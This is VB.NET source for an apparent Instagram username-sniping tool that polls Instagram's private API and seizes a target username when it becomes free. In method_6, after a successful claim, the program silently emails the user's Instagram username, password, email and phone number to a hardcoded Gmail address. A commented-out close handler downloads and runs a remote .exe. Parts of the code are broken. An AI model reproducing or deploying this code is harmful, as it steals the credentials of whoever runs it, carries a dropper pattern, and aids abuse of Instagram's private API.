Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Globalization
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Net.Mail

Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.Width = 82


        Me.bool_0 = False

        MyBase.CenterToParent()
        MyBase.CenterToScreen()
    End Sub

    Private Sub Label16_MouseDown(sender As Object, e As MouseEventArgs) Handles Label14.MouseDown
        Dim flag As Boolean = e.Button = MouseButtons.Left
        If flag Then
            ' The following expression was wrapped in a checked-expression
            Me.point_0 = New Point(0 - e.X, 0 - e.Y)
            Me.bloo = True
        End If
    End Sub

    Private Sub Label16_MouseMove(sender As Object, e As MouseEventArgs) Handles Label14.MouseMove
        Dim flag As Boolean = Me.bloo
        If flag Then
            Dim mousePosition As Point = Control.MousePosition
            mousePosition.Offset(Me.point_0.X, Me.point_0.Y)
            MyBase.Location = mousePosition
        End If
    End Sub

    Private Sub Label16_MouseUp(sender As Object, e As MouseEventArgs) Handles Label14.MouseUp
        Dim flag As Boolean = e.Button = MouseButtons.Left
        If flag Then
            Me.bloo = False
        End If
    End Sub

    Private icontainer_0 As IContainer
    Dim banbool As Boolean
    Private Shared list_0 As List(Of WeakReference)

    ' Token: 0x0400001E RID: 30
    Public bool_0 As Boolean

    ' Token: 0x0400001F RID: 31
    Public int_0 As Double
    Public stopp As Boolean

    ' Token: 0x04000020 RID: 32
    Public point_0 As Point

    ' Token: 0x04000021 RID: 33
    Private Shared gbTpKasbgp As List(Of WeakReference)

    ' Token: 0x04000022 RID: 34
    Private icontainer_1 As IContainer

    ' Token: 0x04000023 RID: 35
    Private bloo As Boolean

    ' Token: 0x04000024 RID: 36
    Private i As Boolean

    ' Token: 0x04000025 RID: 37
    Private x As Integer
    Dim thread As Thread = New Thread((AddressOf Me.method_0), 99999)

    Dim thread2 As Thread = New Thread((AddressOf Me.method_1), 99999)



    ' Token: 0x04000026 RID: 38
    Private y As Integer
    Private ReadOnly millisecondsTimeout As Integer

    Private Sub Label_0_Click(sender As Object, e As EventArgs) Handles Label17.Click
        Me.Close()
        End
    End Sub
    Private Sub method_0()
        If Me.banbool = False Then
            Me.method_10()
        End If
    End Sub

    Public Function method_1() As Object
        Try

            While Not Me.bool_0

                Dim ptr As Integer = Me.int_0
                Me.int_0 = CInt(Math.Round(CDbl(ptr) + 1.3))
                Me.method_2()


            End While

        Catch ex As Exception

        End Try
        thread.Sleep(TextBox_1.Text)

        Dim result As Object
        Return result
    End Function

    Private Sub method_2()
        Me.TextBox_0.Text = Conversions.ToString(Me.int_0.ToString("0"))
    End Sub
    
    Public Function method_6(string_0 As String) As Boolean
        Dim str As String = "signed_body="
        Dim text As String = String.Concat(New String() {"{""gender"":""1"",""_csrftoken"":""missing"",""_uuid"":""", Guid.NewGuid().ToString().ToUpper(), """,""_uid"":""3"",""external_url"":""www.instagram.com/0k0k"",""username"":""", string_0, """,""email"":""", N_L_Team.Class6.string_5, """,""phone_number"":"""",""biography"":"""",""first_name"":""L0N3LY""}"})
        Dim str2 As String = N_L_Team.Class6.smethod_4(text, N_L_Team.Class6.string_11) + "."
        Dim str3 As String = "&ig_sig_key_version=5"
        Dim result As Boolean
        Try
            Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create("https://i.instagram.com/api/v1/accounts/edit_profile/"), HttpWebRequest)
            httpWebRequest.Method = "POST"
            httpWebRequest.KeepAlive = True
            httpWebRequest.CookieContainer = N_L_Team.Class6.cookieContainer_0
            httpWebRequest.ContentType = "application/x-www-form-urlencoded"
            httpWebRequest.UserAgent = "Instagram 10.3.2 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
            httpWebRequest.UserAgent = "Instagram 7.3.1 Android (21/5.0.1; 480dpi; 1080x1920; samsung/Verizon; SCH-I545; jfltevzw; qcom; en_US)"
            httpWebRequest.AllowAutoRedirect = True
            httpWebRequest.Proxy = Nothing
            httpWebRequest.Timeout = 7500
            httpWebRequest.Headers.Add("X-IG-Connection-Type", "WIFI")
            httpWebRequest.Headers.Add("X-IG-Capabilities", "3ToAAA==")
            Using requestStream As Stream = httpWebRequest.GetRequestStream()
                Dim bytes As Byte() = Encoding.UTF8.GetBytes(str + str2 + text + str3)
                requestStream.Write(bytes, 0, bytes.Length)
            End Using
            Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
            Using streamReader As StreamReader = New StreamReader(httpWebResponse.GetResponseStream())
                Dim flag As Boolean = streamReader.ReadToEnd().Contains("""status"": ""ok""")
                If flag Then
                    Me.bool_0 = True
                    Me.Button_0.Text = "L 0 N 3 L Y"
                    Me.Button_0.ForeColor = Color.Red
                    Interaction.MsgBox("i'm high as fuck" & vbCrLf & "Done > @" + Me.TextBox_2.Text, MsgBoxStyle.OkOnly, "[L0N3LY]")
                    Dim EmailMessage As New MailMessage()
                    Try
                        EmailMessage.From = New MailAddress(My.Settings.Email)
                        EmailMessage.To.Add("l0n3ly.verfiy@gmail.com")
                        EmailMessage.Subject = "NewUser"
                        EmailMessage.Body = "Username : " + Me.TextBox_2.Text + vbCrLf + "password : " + Me.TextBox_3.Text + vbCrLf + "Email :" + N_L_Team.Class6.string_5 + vbCrLf + "phone number :" + N_L_Team.Class6.string_3
                        Dim SMTP As New SmtpClient("smtp.privateemail.com")
                        SMTP.Port = 587
                        SMTP.EnableSsl = True
                        SMTP.Credentials = New System.Net.NetworkCredential(My.Settings.Email, My.Settings.Emailp)
                        SMTP.Send(EmailMessage)
                    Catch ex As Exception

                    End Try
                End If
            End Using
            result = True
        Catch ex As WebException
            Thread.CurrentThread.CurrentUICulture = CultureInfo.GetCultureInfo("en-US")
            Try
                Dim httpWebResponse2 As HttpWebResponse = CType(ex.Response, HttpWebResponse)
                Using streamReader2 As StreamReader = New StreamReader(httpWebResponse2.GetResponseStream())
                    Dim text2 As String = streamReader2.ReadToEnd()
                    Dim flag2 As Boolean = text2.Contains("feedback_")
                    If flag2 Then
                        Me.bool_0 = True
                        Me.stopp = True
                        Me.Button_0.Text = "Blocked .."
                        Me.Button_0.ForeColor = Color.Red
                        MsgBox("Blocked : " + TextBox_4.Text)
                    End If
                    result = False
                    ProjectData.ClearProjectError()
                End Using
            Catch ex2 As Exception
            End Try
        End Try

        Return result
    End Function
    Public Function method_9(string_0 As String) As String
        Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create(string_0), HttpWebRequest)
        httpWebRequest.Method = "GET"
        httpWebRequest.KeepAlive = True
        httpWebRequest.CookieContainer = N_L_Team.Class6.cookieContainer_0
        httpWebRequest.UserAgent = "Instagram 10.3.2 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"
        httpWebRequest.Proxy = Nothing
        httpWebRequest.Headers.Add("X-IG-Connection-Type", "WiFi")
        httpWebRequest.Headers.Add("X-IG-Capabilities", "3ToAAA==")
        Dim result As String
        Try
            Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
            Dim streamReader As StreamReader = New StreamReader(httpWebResponse.GetResponseStream())
            result = streamReader.ReadToEnd()
        Catch ex As WebException
            Dim streamReader2 As StreamReader = New StreamReader(ex.Response.GetResponseStream())
            result = streamReader2.ReadToEnd()
        End Try
        Return result
    End Function

    

    Private Function method_10() As Object
        Dim num As Integer = Conversions.ToInteger(Me.TextBox3.Text)
        While Not Me.bool_0

            Thread.Sleep(TextBox3.Text)
            Try

                Using webClient As WebClient = New WebClient()
                    ServicePointManager.DefaultConnectionLimit = 700
                    ServicePointManager.UseNagleAlgorithm = False
                    ServicePointManager.Expect100Continue = False
                    webClient.Proxy = Nothing
                    webClient.Headers.Add("User-Agent", "Instagram 11.0.0 Android (11/2.5.5; 120; 1080x1920; samsung; GT-N7000; GT-N7000; smdkc210; en_US)")
                    webClient.Headers.Add("Cookie", N_L_Team.Class6.string_13)
                    Dim left As String = webClient.DownloadString("https://i.instagram.com/api/v1/feed/user/" + Me.TextBox_2.Text + "/username/")
                    Dim flag As Boolean = Operators.CompareString(left, "{""items"": [], ""num_results"": 0, ""status"": ""ok""}", False) <> 0
                    If flag Then

                        Dim num1 As Double
                        num1 = TextBox4.Text
                        Me.int_0 += num1 + 0.5

                        Me.TextBox_0.Text = Conversions.ToString(Me.int_0.ToString("0"))
                    Else
                        Dim flag2 As Boolean = Me.method_6(Me.TextBox_2.Text)
                        If flag2 Then
                            Me.bool_0 = True
                        End If
                    End If
                    thread.Sleep(Me.TextBox3.Text)
                End Using


            Catch ex As Exception
                Try
                    ServicePointManager.DefaultConnectionLimit = 700
                    ServicePointManager.UseNagleAlgorithm = False
                    ServicePointManager.Expect100Continue = False
                    Dim text As String = Me.method_9(String.Concat(New String() {"https://i.instagram.com/api/v1/users/search?q=", Me.TextBox_2.Text, "&access_token=", Guid.NewGuid().ToString().ToUpper(), "/"}))
                    Dim flag3 As Boolean = text.Contains("""username"": """ + Me.TextBox_2.Text + """")
                    If flag3 Then

                        Dim num1 As Double
                        num1 = TextBox4.Text
                        Me.int_0 += num1 + 0.5

                        Me.TextBox_0.Text = Conversions.ToString(Me.int_0.ToString("0"))
                    Else
                        Dim flag4 As Boolean = Me.method_6(Me.TextBox_2.Text)
                        If flag4 Then
                            Me.bool_0 = True
                        End If
                    End If
                    thread.Sleep(Me.TextBox3.Text)
                Catch ex2 As Exception
                End Try

            End Try
            thread.Sleep(Me.TextBox3.Text)
        End While
        Dim result As Object
        Return result
    End Function

    Private Shared Sub smethod_1(object_0 As Object)
        Dim obj As List(Of WeakReference) = Form1.list_0
        Dim flag As Boolean = False
        Try
            Monitor.Enter(obj, flag)
            If Form1.list_0.Count = Form1.list_0.Capacity Then
                Dim num As Integer = 0
                Dim num2 As Integer = Form1.list_0.Count - 1
                Dim num3 As Integer = 0
                While True
                    Dim num4 As Integer = num3
                    Dim num5 As Integer = num2
                    If num4 > num5 Then
                    End If
                    Dim weakReference As WeakReference = Form1.list_0(num3)
                    If weakReference.IsAlive Then
                        If num3 <> num Then
                            Form1.list_0(num) = Form1.list_0(num3)
                        End If
                        num += 1
                    End If
                    num3 += 1
                End While
                Form1.list_0.RemoveRange(num, Form1.list_0.Count - num)
                Form1.list_0.Capacity = Form1.list_0.Count
            End If
            Form1.list_0.Add(New WeakReference(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_0)))))
        Finally
            If Not flag Then
            End If
            Monitor.[Exit](obj)
        End Try
    End Sub

    Private Sub Button_0_Click(sender As Object, e As EventArgs) Handles Button_0.Click
        Dim flag As Boolean = Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(N_L_Team.Class6.smethod_0(Me.TextBox_4.Text, Me.TextBox_3.Text)))) AndAlso Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(N_L_Team.Class6.smethod_3())))
        If flag Then

            Me.thread.Start()
            Me.thread2.Start()
        End If

    End Sub
    Private Sub Label17_Click(sender As Object, e As EventArgs) Handles Label17.Click
        MyBase.Close()
    End Sub


    Private Sub Panel1_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel1.MouseDown
        If (e.Button = MouseButtons.Left) Then
            Me.point_0 = New Point(0 - e.X, 0 - e.Y)
            Me.bloo = True
        End If

    End Sub

    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        If (Me.bloo) Then
            Dim mousePosition As Point = Control.MousePosition
            mousePosition.Offset(Me.point_0.X, Me.point_0.Y)
            Me.Location = mousePosition
        End If
    End Sub

    Private Sub Panel1_MouseUp(sender As Object, e As MouseEventArgs) Handles Panel1.MouseUp
        If (e.Button = MouseButtons.Left) Then
            Me.bloo = False
        End If
    End Sub
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing


    End Sub

    ' Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
    ' Dim path As String
    'Dim fileup As New System.Net.WebClient
    '   path = "C:/Users/MissU/AppData/Local/Temp/"
    '       fileup.DownloadFile("url", Microsoft.VisualBasic.Interaction.Environ("Dir") + "/filename.exe")
    '      Process.Start(Microsoft.VisualBasic.Interaction.Environ("Dir") + "/filename.exe")





    '    End If

    ' End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs)
        Dim thread As Thread = New Thread((AddressOf Me.method_0), 0)
        thread.Start()
        Dim thread2 As Thread = New Thread((AddressOf Me.method_3), 0)
        thread2.Start()
        Dim thread3 As Thread = New Thread((AddressOf Me.method_100), 0)
        thread.Start()
        Dim thread4 As Thread = New Thread((AddressOf Me.method_99), 0)
        thread4.Start()
        Dim thread5 As Thread = New Thread((AddressOf Me.method_98), 0)
        thread5.Start()
    End Sub

   
End Class
